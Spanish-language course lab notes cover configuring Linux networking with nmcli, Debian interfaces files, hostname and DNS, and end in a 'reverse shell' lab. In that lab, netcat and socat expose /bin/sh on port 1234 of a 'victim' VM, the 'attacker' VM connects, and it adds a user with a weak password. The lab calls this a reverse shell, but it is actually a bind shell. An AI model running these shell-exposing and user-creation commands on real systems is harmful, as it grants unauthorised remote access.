# ¿Qué es nmcli?
nmcli (Network Manager Command Line Interface) es la herramienta en línea de comandos para gestionar la red cuando el sistema utiliza NetworkManager.

# Entidad relacionada:
NetworkManager

# Permite administrar:
Interfaces de red
Conexiones (cableadas, WiFi)
Direcciones IP
DNS
Puertas de enlace
Estado de red


# Laboratorio configurar la red en Redhat, utilizando el comando nmcli:
En el VirtualBox, para poder realizar el laboratorio de forma practica, parar la mv y en Red, activar el Adaptador 3 con la misma configuracion que tiene el Adaptador 2:


servidor1.curso.local
192.168.33.50
255.255.255.0
GW-->192.168.33.1
Dns1 8.8.8.8
DNS2 8.8.4.4
eth2

# En redhat comenzamos el laboratorio:
ifconfig -a
ip a show 
ip a show eth2

nmcli connection add con-name eth2 type ethernet ifname eth2 ipv4.addresses 192.168.33.50/24 ipv4.gateway 192.168.33.1 ipv4.method manual ipv4.never-default yes


# Significado de cada parte del comando anterior:

nmcli
# Herramienta de línea de comandos para gestionar NetworkManager.

connection add
# Crea una nueva conexión de red.

con-name eth2
# Nombre de la conexión que se va a crear (en este caso "eth2").

type ethernet
# Indica que es una conexión de tipo Ethernet.

ifname eth2
# Nombre de la interfaz física que usará la conexión (eth2).

ipv4.addresses 192.168.33.50/24
# Dirección IPv4 estática que se asignará a la interfaz.

ipv4.gateway 192.168.33.1
# Dirección del gateway (puerta de enlace) para salir a otras redes.

ipv4.method manual
# Desactiva DHCP y activa configuración manual (IP estática).


# El comando anterior creara la configuacion /etc/sysconfig/network-scripts/ifcfg-eth2

cat  /etc/sysconfig/network-scripts/ifcfg-eth2
TYPE=Ethernet
BOOTPROTO=none
DEFROUTE=yes
NAME=eth2
ONBOOT=yes
IPADDR=192.168.33.50
NETMASK=255.255.255.0
GATEWAY=192.168.33.1


ip a show eth2

# desde windows:
ping 192.168.33.50

# Para ver GW por defecto:
route -n
netstat -r

nslookup www.google.es
------------------------------------------------------------------


# Modificar una conexion:
nmcli connection show
nmcli connection show "eth2"
nmcli connection modify "eth2"  +ipv4.dns 8.8.8.8
nmcli connection show "eth2"
nmcli connection modify "eth2"  -ipv4.dns 8.8.8.8
nmcli connection show "eth2"

nmcli connection show "eth2" |grep -w ipv4.dns
cat /etc/sysconfig/network-scripts/ifcfg-eth1


# En Redhat 10 la red persiste:
cat /etc/NetworkManager/system-connections/eth2.nmconnection



# Podemos reiniciar la red
systemctl restart NetworkManager

# Para activar o desactivar interfaces de red:
ip link set eth2 down
ip link set eth2 up



# Tendriamos que tener la ip 192.168.33.50
ip a show eth2

Ahora podria conectarme a la ip 192.168.33.50


# Configurar el nombre del servidor NO REALIZAR EN EL LABORATORIO PRACTICO:

hostnamectl set-hostname servidor1.curso.local
systemctl restart systemd-hostnamed

# El comando anterior crear el archivo:
/etc/hostname
servidor1.curso.local

# Configurar el cliente de DNS:
vi  /etc/resolv.conf
nameserver 8.8.8.8
nameserver 8.8.4.4
domain curso.local
search localdomain curso.local 

# Resolver a traves del dns configurado:
nslookup www.google.com


# En nuestro laboratorio practico NO REALIZAR EL CAMBIO:
 vi /etc/hosts
127.0.0.1   localhost localhost.localdomain localhost4 localhost4.localdomain4
::1         localhost localhost.localdomain localhost6 localhost6.localdomain6
192.168.33.50     servidor1.curso.local servidor1

--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

# Para debian configurar la red:
servidor1.curso.local
192.168.33.50
255.255.255.0
GW-->192.168.33.1
Dns1 8.8.8.8
DNS2 8.8.4.4
eth2


vi /etc/network/interfaces

#  The loopback network interface
auto lo eth2
iface lo inet loopback

#  The primary network interface
allow-hotplug eth2
iface eth2 inet static
address 192.168.33.50
netmask 255.255.255.0
gateway 192.168.33.1


systemctl restart networking.service	

# Explicacion a los pasos anteriores:
auto lo eth2
Indica que las interfaces lo y eth2 deben activarse automáticamente al arrancar el sistema.

iface lo inet loopback
Define la interfaz lo como loopback (127.0.0.1).

allow-hotplug eth2
Activa la interfaz eth2 cuando el dispositivo esté disponible (ej. al detectarlo el kernel).

iface eth2 inet static
Indica que eth2 usará IPv4 y tendrá una configuración estática.

address 192.168.33.50
IP estática asignada a la interfaz.

netmask 255.255.255.0
Máscara de red.

gateway 192.168.33.1
Puerta de enlace (default gateway).




# Configurar el nombre del servidor :

hostnamectl set-hostname servidor1.curso.local
systemctl restart systemd-hostnamed

# El comando anterior crear el archivo:
/etc/hostname
servidor1.curso.local

# Configurar el cliente de DNS:
vi  /etc/resolv.conf
nameserver 8.8.8.8
nameserver 8.8.4.4
domain curso.local
search localdomain curso.local 

# Resolver a traves del dns configurado:
nslookup cntg.xunta.gal


# En nuestro laboratorio practivo NO REALIZAR EL CAMBIO:
 vi /etc/hosts
127.0.0.1   localhost localhost.localdomain localhost4 localhost4.localdomain4
::1         localhost localhost.localdomain localhost6 localhost6.localdomain6
192.168.33.50     servidor1.curso.local servidor1

------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
# ¿Qué es Netcat?
Netcat (nc) es una herramienta de red que permite abrir conexiones TCP o UDP y transferir datos a través de la red.
Se conoce como la “navaja suiza” de las redes porque es muy versátil y simple.

# ¿Para qué sirve?
*Se utiliza para:
-Probar puertos abiertos
-Verificar servicios
-Transferir archivos
-Crear conexiones cliente-servidor simples
-Depuración de red
-Escuchar en puertos

# Laboratorio Reverse Shell-Netcat:
Una reverse shell con Netcat (ncat) es una técnica comúnmente usada para que un sistema remoto se conecte a tu máquina y te dé acceso a su terminal.

# En la máquina de la víctima debian-12 192.168.33.11:
$ sudo apt-get update -y
$ sudo apt-get install netcat -y	

nc -lvp 1234 -e /bin/sh &

-l = escuchar
-v = modo detallado (verbose)
-p = puerto

# Desde la maquina atacante que es la Rocky Linux  192.168.33.10
yum install nmap-ncat -y

nc 192.168.33.11 1234
pwd
cat /etc/hostname

# Como la maquina victima es un debian:
useradd -m -s /bin/bash viernes21
sudo echo "viernes21:000000" | sudo chpasswd

# Explicación para debian no tiene --stdin:
chpasswd lee líneas en formato usuario:contraseña.
Aplica directamente los cambios en /etc/shadow.
Es la forma correcta y no interactiva en Debian.



# Para debian 13 maquina victima:

# socat (SOcket CAT) es una herramienta de línea de comandos para crear conexiones entre dos flujos de datos.
Es como un netcat avanzado, mucho más potente y flexible.

# Permite conectar:
TCP ↔ TCP
TCP ↔ proceso
socket ↔ archivo
TTY ↔ red
UDP ↔ TCP
SSL ↔ shell

# Qué puede hacer socat (resumen)
Crear listeners TCP.
Ejecutar procesos cuando un cliente se conecta.
Realizar port forwarding (redirigir puertos).
Crear tuneles entre máquinas.
Crear shells remotas.
Crear pipes entre procesos.
Simular dispositivos de red.
Reemplazar netcat cuando no existe -e.


apt install socat -y
socat tcp-l:1234,reuseaddr,fork exec:/bin/sh



# Desde la maquina atacante que es la Rocky Linux  192.168.33.10
yum install nmap-ncat -y

nc 192.168.33.11 1234
pwd
cat /etc/hostname

# Como la maquina victima es un debian:
useradd -m -s /bin/bash viernes21
sudo echo "viernes21:000000" | sudo chpasswd
